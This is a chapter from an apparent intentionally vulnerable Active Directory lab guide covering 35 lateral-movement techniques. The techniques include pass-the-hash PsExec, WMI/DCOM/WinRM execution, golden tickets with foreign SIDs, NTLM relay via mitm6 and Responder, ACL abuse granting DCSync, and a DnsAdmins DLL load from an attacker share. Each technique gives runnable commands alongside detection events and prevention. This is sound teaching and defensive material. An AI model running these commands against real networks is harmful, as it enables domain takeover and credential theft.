# 04 — Lateral Movement (LAT-001..035)

Once you have credentials/hashes/tickets, lateral movement is "how do I run code on the next host." DVAD enables every classic primitive: SMB signing off, WinRM open, DCOM enabled, IPv6 stack on, ADIDNS writable, GPP files lying around.

Use these from your **Kali / BlackArch** attacker box on the host bridge, or — once you've landed a beacon via [`02a-initial-access.md`](02a-initial-access.md) — from your foothold on `ws01` / file01 / etc. via a SOCKS pivot.

---

### LAT-001 — PsExec with Pass-the-Hash
**What it is:** classic — create a service over SMB/`ADMIN$`, execute, return output. PtH means you don't need a password, just a hash.
**Why it works here:** SMB signing off; admin hashes recoverable.
**Tools:** `impacket-psexec`, `nxc smb -x`, `psexec64.exe`.
**Steps:**
```bash
impacket-psexec corp.local/Administrator@10.10.0.13 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
nxc smb 10.10.0.13 -u Administrator -H :31d6...0 -x 'whoami /all'
```
**Detection:** Event `7045` (service installed), `4697`, named-pipe `\PSEXESVC`. Sigma "PsExec service installation."
**Prevention:** SMB signing required; block 445/139 east-west; AppLocker; LAPS.

---

### LAT-002 — WMI Exec
**What it is:** create a process remotely via WMI/DCOM (`Win32_Process.Create`). Quieter than PsExec — no service installed.
**Tools:** `impacket-wmiexec`, `Invoke-WmiMethod`, `nxc wmi`.
**Steps:**
```bash
impacket-wmiexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13
nxc wmi 10.10.0.13 -u Administrator -p 'DVADlab2024!' -x 'whoami'
```
**Detection:** Sysmon `1` with parent `WmiPrvSE.exe` + `cmd.exe` child; Event `5861` WMI permanent subscriptions.
**Prevention:** restrict WMI namespace; firewall RPC dynamic ports east-west.

---

### LAT-003 — Scheduled Task Remote
**What it is:** create + run a scheduled task on a remote host via `schtasks /s`.
**Tools:** `schtasks`, `impacket-atexec`, `nxc smb --exec-method atexec`.
**Steps:**
```cmd
schtasks /create /s 10.10.0.13 /tn beacon /tr "C:\Temp\b.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s 10.10.0.13 /tn beacon
```
```bash
impacket-atexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13 'whoami'
```
**Detection:** Event `4698` (task created); `106`/`200` Task Scheduler operational.
**Prevention:** restrict who can connect over Task Scheduler RPC; firewall east-west.

---

### LAT-004 — Service Creation
**What it is:** `sc.exe create` on a remote host. Variant of PsExec without their binary.
**Tools:** `sc.exe`, `impacket-services`.
**Steps:**
```cmd
sc \\10.10.0.13 create EvilSvc binPath= "cmd /c whoami > C:\Temp\o.txt" type= own
sc \\10.10.0.13 start EvilSvc
```
**Detection:** Event `7045` service install on the target.
**Prevention:** restrict SCM remote calls; service install monitoring.

---

### LAT-005 — DCOM Execution
**What it is:** `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow` expose `Document.ActiveView.ExecuteShellCommand`. Authenticated DCOM → arbitrary command.
**Tools:** `impacket-dcomexec`, `Invoke-DCOM.ps1`, `nxc smb -x ... --exec-method mmcexec`.
**Steps:**
```bash
impacket-dcomexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13
```
**Detection:** `mmc.exe` spawning `cmd.exe` or `powershell.exe`.
**Prevention:** restrict DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`); tighter app-launch ACLs (`dcomcnfg`).

---

### LAT-006 — WinRM (Enter-PSSession / evil-winrm)
**What it is:** PowerShell remoting over HTTPS-like protocol. Often legitimate; less noisy than SMB.
**Tools:** `evil-winrm`, `pwsh Enter-PSSession`.
**Steps:**
```bash
evil-winrm -i 10.10.0.13 -u Administrator -p 'DVADlab2024!'
```
```powershell
Enter-PSSession -ComputerName file01 -Credential (Get-Credential)
```
**Detection:** Event `91`/`142` (WSMan operational), `4624` Logon Type 3 with Process `wsmprovhost.exe`.
**Prevention:** restrict TrustedHosts; JEA endpoints; require HTTPS + cert auth.

---

### LAT-007 — RDP with Restricted Admin (PtH RDP)
**What it is:** Restricted Admin RDP doesn't send creds to the target — uses NTLM. PtH-able.
**Tools:** `xfreerdp /pth:HASH`, `mstsc /restrictedadmin`.
**Steps:**
```bash
xfreerdp /v:10.10.0.100 /u:Administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /restricted-admin
```
**Detection:** Event `4624` Logon Type 10 with `RemoteInteractive` and NTLM package on tier-0 → red flag.
**Prevention:** disable RestrictedAdmin (`DisableRestrictedAdmin=1`); Remote Credential Guard.

---

### LAT-008 — Remote Registry
**What it is:** write `HKLM\System\CurrentControlSet\Services\...` remotely to plant services / persistence.
**Tools:** `reg.exe \\host`, `nxc smb --rid-brute`, `impacket-reg`.
**Steps:**
```cmd
reg add \\10.10.0.13\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\Temp\b.exe"
```
**Detection:** Event `4657` registry value modification.
**Prevention:** disable Remote Registry service where unused.

---

### LAT-009 — SMB Named Pipe Exec
**What it is:** `\\host\pipe\atsvc`, `\\host\pipe\svcctl` accept RPC; chained with auth = remote exec.
**Tools:** `impacket-smbexec`.
**Steps:**
```bash
impacket-smbexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13
```
**Detection:** named pipe access events; service installs.
**Prevention:** SMB signing; restrict named-pipe ACLs.

---

### LAT-010 — SSH Tunneling
**What it is:** `file01` has OpenSSH installed (intentional). SSH key reuse from a Linux user gets you onto Linux boxes / VPN pivots.
**Tools:** `ssh`, `sshuttle`, `chisel`.
**Steps:**
```bash
ssh -L 5985:dc01.corp.local:5985 user@file01.corp.local
```
**Detection:** OpenSSH logs `sshd[xxx]: Accepted ...`; auth.log on Linux box.
**Prevention:** key-only auth; restrict who has OpenSSH; segment Linux-in-AD.

---

### LAT-011 — Certificate-Based Auth Relay (ESC1 chain)
**What it is:** ESC1 cert → PKINIT → TGT for target user → PtT.
**Tools:** `Certipy req`, `Certipy auth`.
**Steps:** see DF-012.
**Detection:** Event `4624` Logon Type 3 with PKINIT package; ADCS Event `4886`.
**Prevention:** ESC1 hardening — no SAN spec; manager approval.

---

### LAT-012 — Cross-Forest SID History Abuse
**What it is:** SID filtering disabled on external trust → forge a TGT with `ExtraSids` containing the foreign DA SID → cross-forest DA.
**Tools:** `mimikatz kerberos::golden /sids:`, `Rubeus`.
**Steps:**
```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:finance.local /sid:S-1-5-21-FIN /sids:S-1-5-21-CORP-519 /krbtgt:HASH /ptt"
```
**Detection:** Event `4769` TGS with anomalous SIDs in PAC; MDI "SID-History suspicious activity."
**Prevention:** **enable SID filtering** on every external trust; quarantine attribute; selective auth.

---

### LAT-013 — Shortcut Trust Abuse
**What it is:** shortcut trust between two non-root domains permits skipping the root in Kerberos referrals. Sometimes bypasses transitive-trust filtering.
**Tools:** `Rubeus asktgs /service:.../...`.
**Steps:** Rubeus `asktgs /service:cifs/target.contractor.corp /ptt`.
**Detection:** trust-ticket Event `4769` traffic across unexpected paths.
**Prevention:** remove shortcut trusts not in use; selective auth.

---

### LAT-014 — Realm Trust (MIT Kerberos) Relay
**What it is:** AD ↔ MIT KDC realm trust; RC4 negotiation may allow downgrade and TGT swap.
**Tools:** custom Rubeus + krb5 mit client.
**Detection / Prevention:** disable RC4 on realm trusts; AES only.

---

### LAT-015 — IPv6 DHCPv6 MitM + WPAD Relay (mitm6)
**What it is:** Windows prefers IPv6. Reply to DHCPv6 with your address as DNS → answer DNS for `wpad.corp.local` → serve `wpad.dat` → browsers route through you → NTLM auth → relay to LDAPS.
**Why it works here:** IPv6 enabled, no RA Guard.
**Tools:** `mitm6`, `ntlmrelayx`.
**Steps:**
```bash
sudo mitm6 -i virbr1 -d corp.local
ntlmrelayx.py -t ldaps://dc01.corp.local -wh attacker.corp.local --delegate-access -smb2support
```
**Detection:** unsolicited DHCPv6 advertisements; Sysmon Event `22` DNS for `wpad`; LDAP writes from non-DC.
**Prevention:** disable IPv6 if unused or deploy RA Guard / DHCPv6 Guard; disable WPAD (`Wpad`/`WinHttpProxyType`); GPO disable WPAD auto-detection.

---

### LAT-016 — Resource-Based Constrained Delegation Chain
**What it is:** chain RBCD across multiple hops (compromise A → write RBCD on B → use B to impersonate to C → write RBCD on D ...). BloodHound shows the path.
**Steps / Tools / Detection / Prevention:** see CRED-017.

---

### LAT-017 — ACL Abuse: ForceChangePassword
**What it is:** `User-Force-Change-Password` extended right (or `GenericAll/Write`) lets you reset the target's password without knowing the old one.
**Why it works here:** `helpdesk` has this on Domain Users.
**Tools:** `net user`, `Set-DomainUserPassword` (PowerView), `rpcclient setuserinfo2`.
**Steps:**
```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force)
```
**Detection:** Event `4724` (password reset by admin).
**Prevention:** tier helpdesk; least privilege; just-in-time admin via PIM.

---

### LAT-018 — ACL Abuse: Add Members on Group
**What it is:** `GenericWrite` on a group → add yourself.
**Why it works here:** `helpdesk` has GenericWrite on `IT_Admins`.
**Tools:** `net group`, `Add-DomainGroupMember`.
**Steps:**
```powershell
Add-DomainGroupMember -Identity 'IT_Admins' -Members alice
```
**Detection:** Event `4728`/`4732`/`4756` (member added to security group).
**Prevention:** group-policy-aware delegation; audit privileged group memberships.

---

### LAT-019 — ACL Abuse: Shadow Credentials
**What it is:** same as CRED-008 in PE context — `GenericWrite` → write KeyCredentialLink → PKINIT.

---

### LAT-020 — ACL Abuse: WriteOwner
**What it is:** ownership = the right to give yourself any right. WriteOwner on a target → take ownership → grant GenericAll → escalate.
**Why it works here:** helpdesk has WriteOwner on Domain Admins (deliberate, do not "fix").
**Tools:** PowerView `Set-DomainObjectOwner`.
**Steps:**
```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity alice
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity alice -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members alice
```
**Detection:** Event `5136` modifying `nTSecurityDescriptor` on privileged group.
**Prevention:** audit owner of privileged objects; lock down with AdminSDHolder.

---

### LAT-021 — ACL Abuse: WriteDACL on Domain → DCSync
**What it is:** `GenericAll`/`WriteDACL` on the domain object lets you add `Replicating Directory Changes` to your account → DCSync.
**Tools:** PowerView `Add-DomainObjectAcl -Rights DCSync`.
**Steps:**
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
```
**Detection:** Event `5136` on domain root; MDI "Modification to privileged AD object."
**Prevention:** audit ACEs on `DC=corp,DC=local`; only DCs should have DCSync.

---

### LAT-022 — ACL Abuse: WriteSPN → Kerberoast
**What it is:** with `Validated-SPN` write on another user, add an SPN to them → Kerberoast → crack.
**Tools:** PowerView `Set-DomainObject -Set @{servicePrincipalName='http/x'}`.
**Steps:**
```powershell
Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/x'}
.\Rubeus.exe kerberoast /user:victim /outfile:roast.hashes
```
**Detection:** Event `4738` (account changed) with SPN modification by non-admin.
**Prevention:** restrict Validated-SPN write; monitor SPN additions.

---

### LAT-023 — Cross-Forest TGT Delegation Abuse
**What it is:** trust configured with `Trust Transitivity = Yes` and `TGTDelegation = Yes` (or KDC-level flag) lets foreign TGTs be forwardable across — allowing relay-like attacks.
**Why it works here:** disabled SID filtering + relaxed trust attributes.
**Tools:** `Rubeus`, `nltest /trust_info`.
**Detection:** `4769` for cross-realm TGSs with delegated TGT flag.
**Prevention:** set `EnableTGTDelegation=NO` on every forest trust.

---

### LAT-024 — LDAP Signing Not Required → Relay
**What it is:** see CRED-048. Relay NTLM to LDAP → write any object.

---

### LAT-025 — WebDAV Redirector Coercion
**What it is:** `srvsvc` named pipe path triggers WebDAV client to authenticate to attacker UNC.
**Tools:** `Coercer`, `srvsvc.py`.
**Steps:**
```bash
python3 Coercer.py coerce -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.100 -t file01.corp.local
```
**Detection:** Sysmon `3` outbound from `svchost.exe` (WebClient).
**Prevention:** disable WebClient; force SMB signing.

---

### LAT-026 — KrbRelayUp (Local LPE via Kerberos)
**What it is:** authenticated user on a Windows host can relay machine-account Kerberos to local LSASS pipe and write RBCD on the local machine account → local SYSTEM.
**Why it works here:** default LDAP/LSASS pipe; no machine-account RBCD write restriction.
**Tools:** `KrbRelayUp.exe`.
**Steps:**
```cmd
KrbRelayUp.exe full --Method SCM
```
**Detection:** local `5136` writing `msDS-AllowedToActOnBehalfOfOtherIdentity` on local machine.
**Prevention:** `LdapEnforceChannelBinding=2`; SMB signing; Defender rule "Block credential stealing."

---

### LAT-027 — mitm6 (DHCPv6 → WPAD → NTLM Relay)
**What it is:** see LAT-015 (PLAN.md tracks LAT-027 separately for IPv4-only variant flag).

---

### LAT-028 — LLMNR + SMB Relay
**What it is:** Responder grabs LLMNR/NBT-NS hashes, but instead of cracking, ntlmrelayx relays them to a host without SMB signing → exec.
**Tools:** `Responder` (SMB/HTTP off) + `ntlmrelayx`.
**Steps:**
```bash
sudo responder -I virbr1 -dwv          # SMB/HTTP disabled in Responder.conf
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc ...'
```
**Detection:** Defender for Identity "LLMNR/NBT-NS spoofing" + "Suspected NTLM relay attack."
**Prevention:** disable LLMNR/NBT-NS, force SMB signing.

---

### LAT-029 — SCShell (binPath modification)
**What it is:** modify an *existing* service's `binPath` remotely (no install) → restart → exec → restore. Quieter than PsExec.
**Tools:** `SCShell.py`, `sc config`.
**Steps:**
```bash
python3 SCShell.py 10.10.0.13 XblAuthManager "C:\Windows\System32\cmd.exe /c whoami" corp.local Administrator 'DVADlab2024!'
```
**Detection:** Event `7040` service config changed.
**Prevention:** restrict SCM RPC; monitor `7040`/`7045`.

---

### LAT-030 — RDP Session Hijack
**What it is:** SYSTEM on an RDP host can `tscon` to any disconnected session without their password.
**Tools:** `tscon.exe`, `query session`.
**Steps:**
```cmd
query session
tscon 3 /dest:console
```
**Detection:** Event `4778`/`4779` session reconnect with mismatched user.
**Prevention:** force logoff on disconnect; restrict RDP admin tooling; Remote Credential Guard.

---

### LAT-031 — DnsAdmins → DLL Load on DC
**What it is:** members of `DnsAdmins` can call `dnscmd /config /ServerLevelPluginDll \\attacker\share\evil.dll`. On DNS service restart → DLL loads as SYSTEM (DNS runs on DC).
**Why it works here:** `helpdesk` is in DnsAdmins.
**Tools:** `dnscmd`, msfvenom for DLL.
**Steps:**
```cmd
dnscmd dc01 /config /ServerLevelPluginDll \\10.10.0.100\share\evil.dll
sc \\dc01 stop dns
sc \\dc01 start dns
```
**Detection:** Event `541`/`770` DNS plug-in DLL loaded; Sysmon `7` DLL load from non-MS path in `dns.exe`.
**Prevention:** empty DnsAdmins; KB4014193 (disallows UNC paths in ServerLevelPluginDll).

---

### LAT-032 — ADIDNS Record Write
**What it is:** see CRED-026; lateral aspect = create a record claiming a hostname (`wpad`, `fileserver`) → intercept auth.
**Detection / Prevention:** see CRED-026.

---

### LAT-033 — LNK / SCF / URL on writable share
**What it is:** drop `evil.lnk` (or `.scf`/`.url`) with `IconLocation=\\attacker\share\icon.ico` on a heavily-browsed share. Anyone who opens the share folder triggers an NTLM auth to the attacker.
**Tools:** `ntlm_theft`, `scf-template`.
**Steps:** generate, drop into `\\file01\Public`.
**Detection:** Sysmon `11` (FileCreate) of `.lnk`/`.scf`/`.url`; Event `5145` on suspicious file types.
**Prevention:** block UNC paths to external hosts (firewall); SMB signing.

---

### LAT-034 — Foreign Group Membership (Cross-Forest)
**What it is:** Foreign Security Principal from `finance.local` placed in `corp.local`'s privileged group → cross-forest DA.
**Why it works here:** intentionally pre-populated.
**Tools:** `Get-ADGroupMember`, BloodHound CrossForestACL.
**Steps:**
```powershell
Get-ADGroupMember "Domain Admins" | ? { $_.SID -match 'S-1-5-21-FIN' }
```
**Detection:** Event `4732`/`4756` adding FSP to privileged group.
**Prevention:** never put FSPs in tier-0 groups; selective auth.

---

### LAT-035 — Cross-Forest Golden + SID History (RID > 1000)
**What it is:** forge a TGT and stuff foreign SIDs with RID > 1000 into PAC — some misconfigured SID-filtering setups only filter RIDs ≤ 1000.
**Tools:** mimikatz `kerberos::golden /sids:`, ticketer.py.
**Detection:** anomalous PAC SID list.
**Prevention:** "quarantine" attribute; Kerberos PAC validation; SID filtering with all RID ranges.

---

Next: [`05-privilege-escalation.md`](05-privilege-escalation.md).
